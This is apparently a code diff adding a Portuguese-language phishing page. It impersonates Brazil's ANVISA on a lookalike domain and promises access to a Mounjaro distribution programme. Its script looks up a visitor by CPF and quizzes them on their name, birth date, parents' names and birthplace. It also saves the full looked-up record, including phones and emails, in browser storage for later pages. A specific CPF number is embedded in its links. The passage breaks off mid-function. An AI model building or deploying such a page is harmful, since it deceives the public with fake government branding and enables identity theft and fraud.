+  <div class="bg-white rounded-lg shadow-lg max-w-md w-full p-6">
+    <div class="flex justify-between items-center mb-4">
+      <h2 class="text-xl font-semibold text-gray-800">Configurações de Cookies</h2>
+      <button id="close-cookie-modal" class="text-gray-500 hover:text-gray-700">
+        <i class="fas fa-times text-lg"></i>
+      </button>
+    </div>
+    
+    <div class="space-y-4">
+      <p class="text-sm text-gray-600">
+        Usamos cookies para melhorar sua experiência no site. 
+        Você pode personalizar suas preferências abaixo.
+      </p>
+      
+      <div class="space-y-3">
+        <label class="flex items-center justify-between">
+          <span class="text-sm font-medium">Cookies Essenciais</span>
+          <input type="checkbox" checked="" disabled="" class="w-4 h-4 text-[#1451B4] rounded">
+        </label>
+        
+        <label class="flex items-center justify-between">
+          <span class="text-sm font-medium">Cookies de Análise</span>
+          <input type="checkbox" checked="" class="w-4 h-4 text-[#1451B4] rounded">
+        </label>
+        
+        <label class="flex items-center justify-between">
+          <span class="text-sm font-medium">Cookies de Marketing</span>
+          <input type="checkbox" checked="" class="w-4 h-4 text-[#1451B4] rounded">
+        </label>
+      </div>
+      
+      <div class="flex gap-3 mt-6">
+        <button id="cancel-cookies" class="flex-1 px-4 py-2 bg-gray-200 text-gray-800 rounded-md hover:bg-gray-300 transition-colors">
+          Cancelar
+        </button>
+        <button id="save-cookies" class="flex-1 px-4 py-2 bg-[#1451B4] text-white rounded-md hover:bg-blue-700 transition-colors">
+          Salvar Preferências
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container mx-auto px-4">
+ <div class="py-4">
+  <div class="flex items-center space-x-2 text-[13px]">
+   <a class="text-[#1451B4]" href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+   <span class="text-[#9E9D9D]">&gt;</span>
+   <a class="text-[#1451B4]" href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#">Serviços</a>
+   <span class="text-[#9E9D9D]">&gt;</span>
+   <a class="text-[#1451B4]" href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#">Medicamentos</a>
+   <span class="text-[#9E9D9D]">&gt;</span>
+   <span class="font-bold">Mounjaro® (tirzepatida)</span>
+  </div>
+ </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  // Dropdown menus
+  const menuDropdownBtn = document.getElementById('menu-dropdown-btn');
+  const menuDropdown = document.getElementById('menu-dropdown');
+  const gridMenuBtn = document.getElementById('grid-menu-btn');
+  const gridMenu = document.getElementById('grid-menu');
+  
+  // Mobile menu
+  const mobileMenuBtn = document.getElementById('mobile-menu-btn');
+  const mobileMenuOverlay = document.getElementById('mobile-menu-overlay');
+  const closeMobileMenu = document.getElementById('close-mobile-menu');
+  
+  // Cookie modal
+  const cookieSettingsBtn = document.getElementById('cookie-settings-btn');
+  const cookieModal = document.getElementById('cookie-modal');
+  const closeCookieModal = document.getElementById('close-cookie-modal');
+  const cancelCookies = document.getElementById('cancel-cookies');
+  const saveCookies = document.getElementById('save-cookies');
+  
+  // Toggle dropdown menus
+  function toggleDropdown(button, dropdown) {
+    const isVisible = !dropdown.classList.contains('hidden');
+    
+    // Fechar todos os dropdowns
+    document.getElementById('menu-dropdown').classList.add('hidden');
+    document.getElementById('grid-menu').classList.add('hidden');
+    
+    // Abrir o dropdown específico se estava fechado
+    if (!isVisible) {
+      dropdown.classList.remove('hidden');
+    }
+  }
+  
+  menuDropdownBtn.addEventListener('click', (e) => {
+    e.stopPropagation();
+    toggleDropdown(menuDropdownBtn, menuDropdown);
+  });
+  
+  gridMenuBtn.addEventListener('click', (e) => {
+    e.stopPropagation();
+    toggleDropdown(gridMenuBtn, gridMenu);
+  });
+  
+  // Fechar dropdowns ao clicar fora
+  document.addEventListener('click', function() {
+    menuDropdown.classList.add('hidden');
+    gridMenu.classList.add('hidden');
+  });
+  
+  // Evitar que cliques nos dropdowns os fechem
+  menuDropdown.addEventListener('click', (e) => e.stopPropagation());
+  gridMenu.addEventListener('click', (e) => e.stopPropagation());
+  
+  // Mobile menu
+  mobileMenuBtn.addEventListener('click', () => {
+    mobileMenuOverlay.classList.remove('hidden');
+  });
+  
+  closeMobileMenu.addEventListener('click', () => {
+    mobileMenuOverlay.classList.add('hidden');
+  });
+  
+  mobileMenuOverlay.addEventListener('click', (e) => {
+    if (e.target === mobileMenuOverlay) {
+      mobileMenuOverlay.classList.add('hidden');
+    }
+  });
+  
+  // Cookie modal
+  cookieSettingsBtn.addEventListener('click', () => {
+    cookieModal.classList.remove('hidden');
+  });
+  
+  [closeCookieModal, cancelCookies].forEach(btn => {
+    btn.addEventListener('click', () => {
+      cookieModal.classList.add('hidden');
+    });
+  });
+  
+  saveCookies.addEventListener('click', () => {
+    localStorage.setItem('cookiePreferences', JSON.stringify({
+      essential: true,
+      analytics: true,
+      marketing: true
+    }));
+    cookieModal.classList.add('hidden');
+  });
+  
+  cookieModal.addEventListener('click', (e) => {
+    if (e.target === cookieModal) {
+      cookieModal.classList.add('hidden');
+    }
+  });
+  
+  // User data check
+  try {
+    const nomeCompleto = localStorage.getItem('nomeCompleto');
+    const userNameElement = document.getElementById('user-name');
+    const userBtn = document.getElementById('user-btn');
+    
+    if (nomeCompleto && nomeCompleto.trim()) {
+      // Extrair primeiro nome e capitalizar primeira letra
+      const firstName = nomeCompleto.split(' ')[0].trim();
+      const formattedName = firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase();
+      userNameElement.textContent = formattedName;
+      
+      // Remover funcionalidade de clique se já tem nome
+      userBtn.style.cursor = 'default';
+      userBtn.classList.remove('hover:bg-blue-700');
+    }
+  } catch (e) {
+    console.error('Erro ao processar dados do usuário:', e);
+  }
+  
+  // Login button functionality
+  document.getElementById('user-btn').addEventListener('click', () => {
+    const userNameText = document.getElementById('user-name').textContent;
+    if (userNameText === 'Entrar') {
+      window.location.href = '/cadastro';
+    }
+    // Se tem nome, não faz nada (botão desabilitado)
+  });
+});
+</script> 
+<main class="max-w-3xl mx-auto px-4 py-6">
+  <div class="mb-6">
+    <p class="monjauros-title">Mounjaro® (tirzepatida)</p>
+    <h2 class="main-title">
+      Verificação de Elegibilidade ao Programa Nacional
+    </h2>
+    <p class="subtitle">
+      Verificação segura de identidade para acesso ao programa de distribuição
+      do Mounjaro. Este processo garante que apenas pessoas elegíveis tenham
+      acesso ao tratamento, conforme diretrizes do Ministério da Saúde.
+    </p>
+  </div>
+
+  <!-- Indicador de progresso -->
+  <div class="progress-indicator">
+    <div class="progress-bar" id="progressBar" style="width: 40%;"></div>
+  </div>
+
+  <!-- Seção de validação principal -->
+  <div class="validation-section">
+    <div class="mb-4">
+      <p class="text-[15px] font-medium text-gray-800 border-b border-gray-200 pb-2">
+        Processo de Verificação de Identidade
+      </p>
+    </div>
+
+    <!-- Etapa 1: Verificação do CPF -->
+    <div class="validation-step" id="step1">
+      <div class="step-number error" id="step1Number"><i class="fas fa-times text-xs"></i></div>
+      <div class="step-content">
+        <div class="step-title">Verificação de CPF</div>
+        <div class="step-description">
+          Validando documento junto à Receita Federal
+        </div>
+      </div>
+    </div>
+
+    <!-- Dados do CPF -->
+    <div class="data-display" id="cpfData">
+      <div class="data-row">
+        <span class="data-label">CPF:</span>
+        <span class="data-value" id="cpfDisplay">***.***.***-**</span>
+      </div>
+      <div class="data-row">
+        <span class="data-label">Status:</span>
+        <span class="data-value" id="statusDisplay">Falha na conexão</span>
+      </div>
+      <div class="data-row">
+        <span class="data-label">Tempo de consulta:</span>
+        <span class="data-value" id="timeDisplay">--</span>
+      </div>
+      <!-- Foto do usuário (quando disponível) -->
+      <div class="data-row" id="userPhotoRow" style="display: none">
+        <span class="data-label">Foto:</span>
+        <span class="data-value">
+          <img id="userPhoto" src="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800" alt="Foto do usuário" style="
+              max-width: 60px;
+              max-height: 60px;
+              border-radius: 6px;
+              border: 1px solid #e5e7eb;
+            ">
+        </span>
+      </div>
+    </div>
+
+    <!-- Etapa 2: Confirmação de identidade -->
+    <div class="validation-step hidden" id="step2Container">
+      <div class="step-number" id="step2Number">2</div>
+      <div class="step-content">
+        <div class="step-title">Confirmação de Identidade</div>
+        <div class="step-description">
+          Verificando dados pessoais para segurança
+        </div>
+      </div>
+    </div>
+
+    <!-- Seleção de nome -->
+    <div class="hidden" id="nameSelection">
+      <!-- Loading indicator para nome -->
+      <div id="nameLoadingIndicator" class="text-center py-4">
+        <div class="inline-flex items-center text-gray-600">
+          <div class="loader-spinner mr-3"></div>
+          <span class="text-[14px]">Carregando opções de nome...</span>
+        </div>
+      </div>
+
+      <!-- Conteúdo principal (inicialmente oculto) -->
+      <div id="nameContent" class="hidden">
+        <h4 class="text-[14px] font-medium text-gray-800 mb-3">
+          Selecione seu nome completo:
+        </h4>
+        <div class="options-container" id="nameOptions"></div>
+        <div id="nameAlert" class="hidden"></div>
+      </div>
+    </div>
+
+    <!-- Seleção de data -->
+    <div class="hidden" id="dateSelection">
+      <h4 class="text-[14px] font-medium text-gray-800 mb-3">
+        Confirme sua data de nascimento:
+      </h4>
+      <div class="options-container" id="dateOptions"></div>
+      <div id="dateAlert" class="hidden"></div>
+    </div>
+
+    <!-- Etapa 3: Validação nome da mãe -->
+    <div class="validation-step hidden" id="step3Container">
+      <div class="step-number" id="step3Number">3</div>
+      <div class="step-content">
+        <div class="step-title">Validação Adicional</div>
+        <div class="step-description">
+          Verificando informação de segurança adicional
+        </div>
+      </div>
+    </div>
+
+    <!-- Seleção do nome da mãe -->
+    <div class="hidden" id="motherNameSelection">
+      <h4 class="text-[14px] font-medium text-gray-800 mb-3">
+        Selecione o nome da sua mãe:
+      </h4>
+      <div class="options-container" id="motherNameOptions"></div>
+      <div id="motherNameAlert" class="hidden"></div>
+    </div>
+
+    <!-- Seleção do nome do pai -->
+    <div class="hidden" id="fatherNameSelection">
+      <h4 class="text-[14px] font-medium text-gray-800 mb-3">
+        Selecione o nome do seu pai:
+      </h4>
+      <div class="options-container" id="fatherNameOptions"></div>
+      <div id="fatherNameAlert" class="hidden"></div>
+    </div>
+
+    <!-- Seleção do município de nascimento -->
+    <div class="hidden" id="municipalitySelection">
+      <h4 class="text-[14px] font-medium text-gray-800 mb-3">
+        Qual é o seu município oficial de nascimento conforme consta em seus
+        documentos?
+      </h4>
+      <p class="text-[12px] text-gray-600 mb-4">
+        Esta informação deve corresponder exatamente ao que consta em sua
+        certidão de nascimento.
+      </p>
+      <div class="options-container" id="municipalityOptions"></div>
+      <div id="municipalityAlert" class="hidden"></div>
+    </div>
+
+    <!-- Seleção do estado -->
+    <div class="hidden" id="stateSelection">
+      <h4 class="text-[14px] font-medium text-gray-800 mb-3">
+        Qual é o seu estado de residência atual?
+      </h4>
+      <div class="options-container" id="stateOptions"></div>
+      <div id="stateAlert" class="hidden"></div>
+    </div>
+
+    <!-- Conclusão -->
+    <div class="hidden text-center py-6" id="completionSection">
+      <div class="mb-4">
+        <div class="inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-3">
+          <i class="fas fa-check text-2xl text-green-600 checkmark-animated"></i>
+        </div>
+        <h3 class="text-lg font-semibold text-gray-900 mb-2">
+          Dados Validados com Sucesso
+        </h3>
+        <p id="validationSuccessMessage" class="text-gray-600 mb-6">
+          Sua identidade foi verificada. Você pode prosseguir para a próxima
+          etapa do processo.
+        </p>
+      </div>
+      <button class="continue-button" id="continueBtn">
+        Continuar para o Processo
+        <i class="fas fa-arrow-right ml-2"></i>
+      </button>
+    </div>
+  </div>
+
+  <!-- Informações adicionais -->
+  <div class="my-6 py-4 border-t border-gray-200">
+    <p class="font-medium text-gray-800 text-base mb-3">
+      Sistema de Verificação Segura
+    </p>
+    <p class="text-gray-700 text-sm mb-4">
+      Este sistema utiliza dados oficiais da Receita Federal para garantir a
+      autenticidade das informações. Todas as consultas são realizadas de forma
+      segura e confidencial, seguindo as normas de proteção de dados.
+    </p>
+    <div class="flex flex-wrap gap-4 text-[12px] text-gray-600">
+      <span class="flex items-center"><span class="w-2 h-2 bg-green-500 rounded-full mr-2"></span>Conexão
+        SSL</span>
+      <span class="flex items-center"><span class="w-2 h-2 bg-green-500 rounded-full mr-2"></span>Dados
+        Protegidos</span>
+      <span class="flex items-center"><span class="w-2 h-2 bg-green-500 rounded-full mr-2"></span>Processo
+        Oficial</span>
+    </div>
+    <p class="text-xs text-gray-600 border-l-2 border-gray-300 pl-3 mt-4">
+      <strong>Observação:</strong> A validação de identidade é obrigatória
+      conforme regulamentação da ANVISA para acesso a medicamentos controlados.
+    </p>
+  </div>
+</main>
+
+<a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="vlibras-icon">
+  <img src="./index_files/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+</a>
+
+<script>
+  // Variáveis globais
+  let realData = {};
+  let locationData = {};
+  let validationState = "cpf";
+
+  // Funções utilitárias
+  function getUrlParameter(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+  }
+
+  function updateProgress(percentage) {
+    const progressBar = document.getElementById("progressBar");
+    if (progressBar) {
+      progressBar.style.width = percentage + "%";
+    }
+  }
+
+  function getFirstName(fullName) {
+    if (!fullName) return "";
+
+    // Extrair primeiro nome e formatar
+    const firstName = fullName.trim().split(" ")[0];
+    return firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase();
+  }
+
+  function updateStepStatus(stepNumber, status) {
+    const stepElement = document.getElementById(`step${stepNumber}Number`);
+    if (stepElement) {
+      stepElement.className = `step-number ${status}`;
+
+      if (status === "completed") {
+        stepElement.innerHTML =
+          '<i class="fas fa-check text-xs checkmark-animated"></i>';
+      } else if (status === "error") {
+        stepElement.innerHTML = '<i class="fas fa-times text-xs"></i>';
+      } else if (status === "processing") {
+        stepElement.textContent = stepNumber;
+      }
+    }
+  }
+
+  function showElement(elementId) {
+    const element = document.getElementById(elementId);
+    if (element) {
+      element.classList.remove("hidden");
+    }
+  }
+
+  function hideElement(elementId) {
+    const element = document.getElementById(elementId);
+    if (element) {
+      element.classList.add("hidden");
+    }
+  }
+
+  function generateSimilarName(originalName) {
+    const names = [
+      "MARIA SILVA SANTOS",
+      "JOÃO PEREIRA OLIVEIRA",
+      "ANA COSTA FERREIRA",
+      "CARLOS RODRIGUES LIMA",
+      "PATRICIA ALMEIDA SOUZA",
+      "RICARDO BARBOSA NASCIMENTO",
+      "FERNANDA GOMES RIBEIRO",
+      "ANTONIO MARTINS CARVALHO",
+      "JULIANA ROCHA SILVA",
+      "MARCOS TEIXEIRA COSTA",
+      "LUCIANA FERNANDES LIMA",
+      "RAFAEL SANTOS OLIVEIRA",
+      "GABRIEL MOURA BARROS",
+      "ISABELA PINTO ALVES",
+      "PEDRO HENRIQUE VIEIRA",
+      "MATEUS DIAS CORRÊA",
+      "CAMILA BRITO REIS",
+      "FELIPE RAMOS SOARES",
+      "LARISSA CASTRO FREITAS",
+      "VINICIUS MELO DUTRA",
+      "BEATRIZ CARDOSO MACEDO",
+      "GUILHERME LOPES ARAÚJO",
+      "AMANDA TORRES MARTINS",
+      "DANIEL REZENDE PEREIRA",
+      "NATHALIA FERREIRA LOPES",
+      "VICTOR ANDRADE SOUZA",
+      "CAROLINA MORAES ROCHA",
+      "BRUNO CUNHA RODRIGUES",
+      "MARIANA PEIXOTO NUNES",
+      "IGOR SALES FREIRE",
+      "LETÍCIA MONTEIRO COSTA",
+      "HENRIQUE DUARTE GOMES",
+      "JÉSSICA MENDES VASCONCELOS",
+      "EDUARDO TAVARES FONSECA",
+      "THAIS GUIMARÃES PEREIRA",
+      "LUAN MATTOS ALMEIDA",
+      "SABRINA BARRETO SANTANA",
+      "RODRIGO VIEIRA PRADO",
+      "KARINA FIGUEIREDO COSTA",
+      "CAIO RIBEIRO MENDONÇA",
+      "CAMILA PIRES RODRIGUES",
+      "SAMUEL MACHADO CORDEIRO",
+      "HELENA OLIVEIRA VASQUES",
+      "MURILO GONÇALVES BRAGA",
+      "RAFAELA BATISTA LOPES",
+      "DIOGO PACHECO REZENDE",
+      "MONIQUE FRANÇA MOREIRA",
+      "ARTHUR LEITE VASCONCELOS",
+      "PRISCILA LIMA BARBOSA",
+      "DÉBORA CASTRO VASQUEZ",
+      "THIAGO REIS COSTA",
+      "CAMILA SANTANA VIEIRA",
+      "MATEUS BRAGA FERREIRA",
+      "ISADORA MARTINS GONÇALVES",
+      "JONAS PEREIRA MENDES",
+      "LORENA TEIXEIRA CARDOSO",
+      "OTÁVIO CORRÊA PACHECO",
+      "GIOVANA DUARTE MONTEIRO",
+      "RAUL FREITAS RODRIGUES",
+      "BIANCA MELO SOARES",
+      "ANDRÉ LOPES NASCIMENTO",
+      "MELISSA FIGUEIREDO ALVES",
+      "CAUÃ FERREIRA CASTRO",
+      "SOPHIA REZENDE SANTOS",
+      "EDSON BRITO MACHADO",
+      "MANUELA TORRES OLIVEIRA",
+      "FÁBIO PEREIRA DA SILVA",
+      "NICOLE MOURA RIBEIRO",
+      "WELLINGTON NASCIMENTO LIMA",
+      "ANA CLARA GONÇALVES",
+      "RAIMUNDO CAVALCANTI NETO",
+      "TATIANA FREIRE BARROS",
+      "ALINE MACEDO TEIXEIRA",
+      "MAURÍCIO VASCONCELOS COSTA",
+      "ESTER PEREIRA ROCHA",
+      "LEONARDO PEIXOTO REZENDE",
+      "ELISA SOUZA MORAES",
+      "SÉRGIO REIS PINTO",
+      "MARCELA TAVARES CORDEIRO",
+      "WILLIAM BARBOSA GOMES",
+      "SUELLEN ALMEIDA SILVA",
+      "HEITOR ROCHA MOURA",
+      "PAULO CÉSAR FERREIRA",
+      "CLARISSA SOARES PINHEIRO",
+      "FRANCISCO SANTOS LOPES",
+      "NAYARA REZENDE ALMEIDA",
+      "CESAR MARTINS OLIVEIRA",
+      "BRUNA NASCIMENTO FREITAS",
+      "ENZO MORAES SANTANA",
+      "CASSANDRA PACHECO BRITO",
+      "MÁRIO ANDRADE VIEIRA",
+      "KÁTIA LOPES RIBEIRO",
+      "FÁBIO MELO PEREIRA",
+      "ROSELI GOMES MOURA",
+      "ADRIANO DUARTE CASTRO",
+      "VIVIANE FERREIRA PINTO",
+      "TIAGO COSTA VASCONCELOS",
+      "RENATA MARTINS FERNANDES",
+      "DANILO ALVES GOMES",
+      "VANESSA NASCIMENTO SILVA",
+      "JORGE LIMA REZENDE",
+      "SILVANA BRITO TEIXEIRA",
+      "ALEXANDRE SOUZA BARBOSA",
+      "DENISE FREITAS CARDOSO",
+      "FELIPE HENRIQUE MORAES",
+      "ANA BEATRIZ SANTOS",
+      "LUIZ EDUARDO CORRÊA",
+      "PAULA FERNANDA NASCIMENTO",
+      "GABRIELA MORAES OLIVEIRA",
+      "MIGUEL REZENDE COSTA",
+      "ELIANE DUARTE PEREIRA",
+      "SANDRA LOPES MOURA",
+      "ALBERTO BARROS VIEIRA",
+      "ELAINE FIGUEIREDO SANTOS",
+    ];
+
+    let similarName;
+    do {
+      similarName = names[Math.floor(Math.random() * names.length)];
+    } while (similarName === originalName);
+
+    return similarName;
+  }
+
+  function generateSimilarDate(originalDate) {
+    if (!originalDate || originalDate === "--") return "--";
+
+    const [day, month, year] = originalDate.split("/");
+    const dates = [];
+
+    for (let i = 0; i < 5; i++) {
+      let newDay = parseInt(day) + Math.floor(Math.random() * 20) - 10;
+      let newMonth = parseInt(month);
+      let newYear = parseInt(year) + Math.floor(Math.random() * 6) - 3;
+
+      newDay = Math.max(1, Math.min(28, newDay));
+
+      const formattedDate = `${newDay.toString().padStart(2, "0")}/${newMonth.toString().padStart(2, "0")}/${newYear}`;
+      if (formattedDate !== originalDate) {
+        dates.push(formattedDate);
+      }
+    }
+
+    return dates[Math.floor(Math.random() * dates.length)] || originalDate;
+  }
+
+  function createNameOptions(originalName) {
+    // Ocultar loading e mostrar conteúdo
+    hideElement("nameLoadingIndicator");
+    showElement("nameContent");
+
+    const container = document.getElementById("nameOptions");
+    const options = [
+      { name: originalName, correct: true },
+      { name: generateSimilarName(originalName), correct: false },
+      { name: generateSimilarName(originalName), correct: false },
+      { name: generateSimilarName(originalName), correct: false },
+    ];
+
+    // Embaralhar opções
+    options.sort(() => Math.random() - 0.5);
+
+    container.innerHTML = "";
+
+    options.forEach((option) => {
+      const optionDiv = document.createElement("div");
+      optionDiv.className = "option-item";
+      optionDiv.dataset.correct = option.correct;
+      optionDiv.innerHTML = `<div class="font-medium text-gray-900">${option.name}</div>`;
+
+      optionDiv.addEventListener("click", () => handleNameSelection(optionDiv));
+      container.appendChild(optionDiv);
+    });
+  }
+
+  function createDateOptions(originalDate) {
+    const container = document.getElementById("dateOptions");
+    const options = [
+      { date: originalDate, correct: true },
+      { date: generateSimilarDate(originalDate), correct: false },
+      { date: generateSimilarDate(originalDate), correct: false },
+      { date: generateSimilarDate(originalDate), correct: false },
+    ];
+
+    // Embaralhar opções
+    options.sort(() => Math.random() - 0.5);
+
+    container.innerHTML = "";
+
+    options.forEach((option) => {
+      const optionDiv = document.createElement("div");
+      optionDiv.className = "option-item";
+      optionDiv.dataset.correct = option.correct;
+      optionDiv.innerHTML = `<div class="font-medium text-gray-900">${option.date}</div>`;
+
+      optionDiv.addEventListener("click", () => handleDateSelection(optionDiv));
+      container.appendChild(optionDiv);
+    });
+
+    showElement("dateSelection");
+  }
+
+  function handleNameSelection(selectedOption) {
+    // Remover seleções anteriores
+    document.querySelectorAll("#nameOptions .option-item").forEach((opt) => {
+      opt.classList.remove("selected", "correct", "incorrect");
+    });
+
+    selectedOption.classList.add("selected");
+
+    const isCorrect = selectedOption.dataset.correct === "true";
+    const alertDiv = document.getElementById("nameAlert");
+
+    if (isCorrect) {
+      selectedOption.classList.add("correct");
+      alertDiv.className = "alert-message alert-success";
+      alertDiv.innerHTML =
+        '<i class="fas fa-check-circle mr-2 checkmark-animated"></i>Nome correto! Prosseguindo para próxima etapa...';
+      alertDiv.classList.remove("hidden");
+
+      setTimeout(() => {
+        hideElement("nameSelection");
+        createDateOptions(realData.birthDate);
+      }, 1500);
+    } else {
+      selectedOption.classList.add("incorrect");
+      alertDiv.className = "alert-message alert-error";
+      alertDiv.innerHTML =
+        '<i class="fas fa-times-circle mr-2"></i>Nome incorreto. Por favor, selecione o nome correto.';
+      alertDiv.classList.remove("hidden");
+
+      setTimeout(() => {
+        selectedOption.classList.remove("selected", "incorrect");
+        alertDiv.classList.add("hidden");
+      }, 3000);
+    }
+  }
+
+  function handleDateSelection(selectedOption) {
+    // Remover seleções anteriores
+    document.querySelectorAll("#dateOptions .option-item").forEach((opt) => {
+      opt.classList.remove("selected", "correct", "incorrect");
+    });
+
+    selectedOption.classList.add("selected");
+
+    const isCorrect = selectedOption.dataset.correct === "true";
+    const alertDiv = document.getElementById("dateAlert");
+
+    if (isCorrect) {
+      selectedOption.classList.add("correct");
+      alertDiv.className = "alert-message alert-success";
+      alertDiv.innerHTML =
+        '<i class="fas fa-check-circle mr-2 checkmark-animated"></i>Data correta! Validação concluída com sucesso.';
+      alertDiv.classList.remove("hidden");
+
+      // Salvar dados no localStorage
+      localStorage.setItem("nomeCompleto", realData.fullName);
+      localStorage.setItem("cpfValidado", realData.cpf);
+      localStorage.setItem("sexo", realData.sexo || "");
+      localStorage.setItem("dataNascimento", realData.birthDate || "");
+      
+      // 🔥 CORREÇÃO CRÍTICA: Salvar TODOS os dados da API para uso nas próximas páginas
+      // Isso habilita autocompletar de telefones, emails e pré-preenchimento de endereços
+      localStorage.setItem("cpfData", JSON.stringify(realData));
+
+      setTimeout(() => {
+        updateStepStatus(2, "completed");
+        hideElement("dateSelection");
+
+        // Verificar se deve mostrar perguntas de validação adicional (município, mãe ou pai)
+        if (
+          realData.hasMunicipalityName ||
+          realData.hasMotherName ||
+          realData.hasFatherName
+        ) {
+          console.log("🔍 DEBUG: Iniciando validação adicional");
+          showElement("step3Container");
+          updateStepStatus(3, "processing");
+          updateProgress(85);
+
+          // Priorizar pergunta do município se disponível
+          if (realData.hasMunicipalityName) {
+            console.log(
+              "🔍 DEBUG: Mostrando pergunta - Município de nascimento:",
+              realData.municipalityName,
+            );
+            showElement("municipalitySelection");
+            createMunicipalityOptions(realData.municipalityName);
+          } else if (realData.hasMotherName) {
+            console.log(
+              "🔍 DEBUG: Mostrando pergunta - Nome da mãe:",
+              realData.motherName,
+            );
+            showElement("motherNameSelection");
+            createMotherNameOptions(realData.motherName);
+          } else if (realData.hasFatherName) {
+            console.log(
+              "🔍 DEBUG: Mostrando pergunta - Nome do pai:",
+              realData.fatherName,
+            );
+            showElement("fatherNameSelection");
+            createFatherNameOptions(realData.fatherName);
+          }
+        } else {
+          console.log(
+            "🔍 DEBUG: Município, nomes da mãe e pai não disponíveis, verificando pergunta do estado",
+          );
+          // Verificar se deve mostrar pergunta do estado
+          if (locationData.regionName) {
+            console.log(
+              "🌍 DEBUG: Mostrando pergunta do estado (sem validação adicional):",
+              locationData.regionName,
+            );
+            showElement("stateSelection");
+            updateProgress(90);
+            createStateOptions(locationData.regionName);
+          } else {
+            console.log(
+              "🌍 DEBUG: Estado não disponível, finalizando validação",
+            );
+            finishValidation();
+          }
+        }
+      }, 1500);
+    } else {
+      selectedOption.classList.add("incorrect");
+      alertDiv.className = "alert-message alert-error";
+      alertDiv.innerHTML =
+        '<i class="fas fa-times-circle mr-2"></i>Data incorreta. Por favor, selecione a data correta.';
+      alertDiv.classList.remove("hidden");
+
+      setTimeout(() => {
+        selectedOption.classList.remove("selected", "incorrect");
+        alertDiv.classList.add("hidden");
+      }, 3000);
+    }
+  }
+
+  function createMotherNameOptions(originalMotherName) {
+    console.log("🔍 DEBUG [createMotherNameOptions]: Nome da mãe recebido:", originalMotherName);
+    console.log("🔍 DEBUG [createMotherNameOptions]: Tipo:", typeof originalMotherName);
+    console.log("🔍 DEBUG [createMotherNameOptions]: Tamanho:", originalMotherName ? originalMotherName.length : 0);
+    
+    if (!originalMotherName || originalMotherName.trim() === '') {
+      console.error("❌ ERRO: Nome da mãe está vazio ou inválido!");
+      return;
+    }
+    
+    const container = document.getElementById("motherNameOptions");
+    if (!container) {
+      console.error("❌ ERRO: Container motherNameOptions não encontrado!");
+      return;
+    }
+    
+    const options = [
+      { name: originalMotherName.trim(), correct: true },
+      { name: generateSimilarName(originalMotherName), correct: false },
+      { name: generateSimilarName(originalMotherName), correct: false },
+      { name: generateSimilarName(originalMotherName), correct: false },
+    ];
+    
+    console.log("🔍 DEBUG [createMotherNameOptions]: Opções criadas:", options);
+
+    // Embaralhar opções
+    options.sort(() => Math.random() - 0.5);
+
+    container.innerHTML = "";
+
+    options.forEach((option) => {
+      const optionDiv = document.createElement("div");
+      optionDiv.className = "option-item";
+      optionDiv.dataset.correct = option.correct;
+      optionDiv.innerHTML = `<div class="font-medium text-gray-900">${option.name}</div>`;
+
+      optionDiv.addEventListener("click", () =>
+        handleMotherNameSelection(optionDiv),
+      );
+      container.appendChild(optionDiv);
+    });
+  }
+
+  function handleMotherNameSelection(selectedOption) {
+    // Remover seleções anteriores
+    document
+      .querySelectorAll("#motherNameOptions .option-item")
+      .forEach((opt) => {
+        opt.classList.remove("selected", "correct", "incorrect");
+      });
+
+    selectedOption.classList.add("selected");
+
+    const isCorrect = selectedOption.dataset.correct === "true";
+    const alertDiv = document.getElementById("motherNameAlert");
+
+    if (isCorrect) {
+      selectedOption.classList.add("correct");
+      alertDiv.className = "alert-message alert-success";
+      alertDiv.innerHTML =
+        '<i class="fas fa-check-circle mr-2 checkmark-animated"></i>Nome da mãe correto! Validação concluída com sucesso.';
+      alertDiv.classList.remove("hidden");
+
+      setTimeout(() => {
+        hideElement("motherNameSelection");
+
+        // Verificar se também há pergunta do nome do pai
+        if (realData.hasFatherName) {
+          console.log(
+            "🔍 DEBUG: Mostrando próxima pergunta - Nome do pai:",
+            realData.fatherName,
+          );
+          showElement("fatherNameSelection");
+          updateProgress(90);
+          createFatherNameOptions(realData.fatherName);
+        } else {
+          // Se não há pergunta do pai, verificar se deve mostrar pergunta do estado
+          if (locationData.regionName) {
+            console.log(
+              "🌍 DEBUG: Mostrando pergunta do estado (após nome da mãe):",
+              locationData.regionName,
+            );
+            showElement("stateSelection");
+            updateProgress(95);
+            createStateOptions(locationData.regionName);
+          } else {
+            console.log(
+              "🌍 DEBUG: Estado não disponível, finalizando validação",
+            );
+            updateStepStatus(3, "completed");
+            finishValidation();
+          }
+        }
+      }, 1500);
+    } else {
+      selectedOption.classList.add("incorrect");
+      alertDiv.className = "alert-message alert-error";
+      alertDiv.innerHTML =
+        '<i class="fas fa-times-circle mr-2"></i>Nome da mãe incorreto. Por favor, selecione o nome correto.';
+      alertDiv.classList.remove("hidden");
+
+      setTimeout(() => {
+        selectedOption.classList.remove("selected", "incorrect");
+        alertDiv.classList.add("hidden");
+      }, 3000);
+    }
+  }
+
+  function createFatherNameOptions(originalFatherName) {
+    const container = document.getElementById("fatherNameOptions");
+    const options = [
+      { name: originalFatherName, correct: true },
+      { name: generateSimilarName(originalFatherName), correct: false },
+      { name: generateSimilarName(originalFatherName), correct: false },
+      { name: generateSimilarName(originalFatherName), correct: false },
+    ];
+
+    // Embaralhar opções
+    options.sort(() => Math.random() - 0.5);
+
+    container.innerHTML = "";
+
+    options.forEach((option) => {
+      const optionDiv = document.createElement("div");
+      optionDiv.className = "option-item";
+      optionDiv.dataset.correct = option.correct;
+      optionDiv.innerHTML = `<div class="font-medium text-gray-900">${option.name}</div>`;
+
+      optionDiv.addEventListener("click", () =>
+        handleFatherNameSelection(optionDiv),
+      );
+      container.appendChild(optionDiv);
+    });
+  }
+
+  function handleFatherNameSelection(selectedOption) {
+    // Remover seleções anteriores
+    document
+      .querySelectorAll("#fatherNameOptions .option-item")
